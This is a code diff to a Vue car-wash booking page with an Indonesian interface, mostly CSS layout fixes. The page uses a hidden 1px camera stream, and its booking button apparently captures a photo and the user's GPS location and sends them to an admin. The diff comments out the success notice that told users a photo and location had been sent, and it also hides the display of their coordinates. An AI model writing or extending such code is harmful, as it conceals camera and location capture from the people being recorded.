@@ -174,10 +174,10 @@ async function handlePesanSekarang() {
 
     if (insertError) throw insertError
 
-    showMessage(
-      'Pesanan berhasil! Foto dan lokasi sudah dikirim ke admin.',
-      'success'
-    )
+    // showMessage(
+    //   'Pesanan berhasil! Foto dan lokasi sudah dikirim ke admin.',
+    //   'success'
+    // )
 
     // 5. Scroll ke section layanan setelah sukses
     setTimeout(() => {
@@ -240,39 +240,35 @@ onUnmounted(() => {
           </p>
           <p class="tagline">Mobil Bersih,<br />Perjalanan Lebih Nyaman.</p>
 
-          <!-- Tombol utama: klik langsung jalankan kamera + GPS + Supabase -->
-          <button
-            class="primary-button"
-            :disabled="loading || !cameraActive"
-            @click="handlePesanSekarang"
-          >
-            <span class="calendar-icon">▦</span>
-            {{
-              loading
-                ? 'Memproses Pesanan...'
-                : cameraActive
-                  ? 'Pesan Sekarang'
-                  : 'Menyiapkan Kamera...'
-            }}
-            <span class="arrow">→</span>
-          </button>
+          <!-- Bungkus tombol dan pesan agar berada di layer paling atas -->
+          <div class="action-area">
+            <button
+              class="primary-button"
+              :disabled="loading || !cameraActive"
+              @click="handlePesanSekarang"
+            >
+              <span class="calendar-icon">▦</span>
+              {{
+                loading
+                  ? 'Memproses Pesanan...'
+                  : cameraActive
+                    ? 'Pesan Sekarang'
+                    : 'Menyiapkan Kamera...'
+              }}
+              <span class="arrow">→</span>
+            </button>
 
-          <!-- Pesan status (sukses/error) -->
-          <div
-            v-if="message"
-            class="message-box"
-            :class="messageType"
-          >
-            {{ message }}
-          </div>
+            <!-- <div v-if="message" class="message-box" :class="messageType">
+              {{ message }}
+            </div>
 
-          <!-- Info lokasi setelah berhasil -->
-          <div v-if="coordinates" class="location-info">
-            <p>
-              📍 Lokasi terdeteksi: {{ coordinates.latitude.toFixed(5) }},
-              {{ coordinates.longitude.toFixed(5) }}
-              (±{{ Math.round(coordinates.accuracy) }} m)
-            </p>
+            <div v-if="coordinates" class="location-info">
+              <p>
+                📍 Lokasi terdeteksi: {{ coordinates.latitude.toFixed(5) }},
+                {{ coordinates.longitude.toFixed(5) }}
+                (±{{ Math.round(coordinates.accuracy) }} m)
+              </p>
+            </div> -->
           </div>
         </div>
 
@@ -553,6 +549,13 @@ h1 span {
   line-height: 1.35;
 }
 
+/* ====== AREA TOMBOL & PESAN (DIPERBAIKI) ====== */
+.action-area {
+  position: relative;
+  z-index: 10; /* Memaksa tombol & pesan selalu di atas ilustrasi */
+  margin-top: 20px;
+}
+
 .primary-button {
   display: inline-flex;
   min-height: 56px;
@@ -568,6 +571,8 @@ h1 span {
   box-shadow: 0 8px 0 #e59b00, 0 13px 24px rgba(173, 116, 0, .18);
   cursor: pointer;
   transition: transform .15s ease, box-shadow .15s ease, opacity .15s ease;
+  position: relative;
+  z-index: 10;
 }
 
 .primary-button:hover:not(:disabled) {
@@ -594,7 +599,7 @@ h1 span {
   font-size: 22px;
 }
 
-/* ====== VIDEO STREAM TERSEMBUNYI (tetap render untuk capture) ====== */
+/* ====== VIDEO STREAM TERSEMBUNYI ====== */
 .camera-stream-hidden {
   position: absolute;
   width: 1px;
@@ -612,6 +617,8 @@ h1 span {
   font-size: 13px;
   font-weight: 700;
   line-height: 1.4;
+  position: relative;
+  z-index: 10; /* Pastikan pesan tidak tertutup */
 }
 
 .message-box.success {
@@ -634,9 +641,11 @@ h1 span {
   font-size: 11px;
   font-weight: 700;
   color: #12376f;
+  position: relative;
+  z-index: 10;
 }
 
-/* ====== HERO ART (tidak diubah) ====== */
+/* ====== HERO ART (ILUSTRASI) ====== */
 .hero-art {
   position: absolute;
   right: 0;
@@ -648,6 +657,8 @@ h1 span {
   border-radius: 150px 0 0 20px;
   background: linear-gradient(180deg, #168de8 0%, #0756b5 70%, #0b3c87 100%);
   box-shadow: inset 0 15px 30px rgba(255, 255, 255, .2);
+  z-index: 1; /* Turunkan posisinya di bawah tombol */
+  pointer-events: none; /* Biarkan klik menembus ilustrasi jika bertumpuk */
 }
 
 .sun {
@@ -704,9 +715,10 @@ h1 span {
   transform: scale(.7);
 }
 
+/* Tulisan CAR WASH digeser ke atas agar tidak menabrak tombol */
 .wash-sign {
   position: absolute;
-  top: 82px;
+  top: 20px;
   left: 20px;
   z-index: 2;
   padding: 8px 18px;
@@ -1099,6 +1111,8 @@ h1 span {
   font-size: 13px;
 }
 
+/* ====== MEDIA QUERIES (RESPONSIVE) ====== */
+
 @media (min-width: 900px) {
   .page-shell { padding: 32px; }
   .app { border-radius: 30px; }
@@ -1132,16 +1146,37 @@ h1 span {
   .page-shell { padding: 0; background: #fff; }
   .app { max-width: 480px; min-height: 100vh; border-radius: 0; box-shadow: none; }
   .topbar { padding: 18px 20px; }
-  .hero { min-height: 690px; padding: 126px 25px 110px; }
-  .hero-copy { width: 75%; }
-  .hero-art { right: -8px; bottom: 56px; width: 82%; height: 340px; }
+  
+  /* Diperbaiki untuk layar HP */
+  .hero { 
+    min-height: 740px; /* Ditinggikan agar tombol punya ruang napas */
+    padding: 126px 25px 110px; 
+  }
+  
+  .hero-copy { width: 90%; } /* Diperlebar agar tombol muat */
+  
+  .hero-art { 
+    right: -20px; 
+    bottom: 30px; 
+    width: 85%; 
+    height: 320px; 
+    opacity: 0.9; /* Sedikit transparan agar teks di belakang tetap terbaca */
+  }
+  
+  .wash-sign {
+    top: 10px; /* Digeser ke atas di mobile agar tidak menutupi tombol */
+    left: 10px;
+    font-size: 12px;
+    padding: 6px 12px;
+  }
+
   .services { padding: 28px 20px 25px; }
   .vehicle-grid { gap: 10px; }
   .vehicle-card { min-height: 178px; }
 }
 
 @media (max-width: 370px) {
-  .hero { min-height: 650px; padding-right: 18px; padding-left: 18px; }
+  .hero { min-height: 680px; padding-right: 18px; padding-left: 18px; }
   .hero-art { width: 88%; height: 300px; }
   .vehicle-grid { gap: 7px; }
   .vehicle-card { min-height: 160px; }
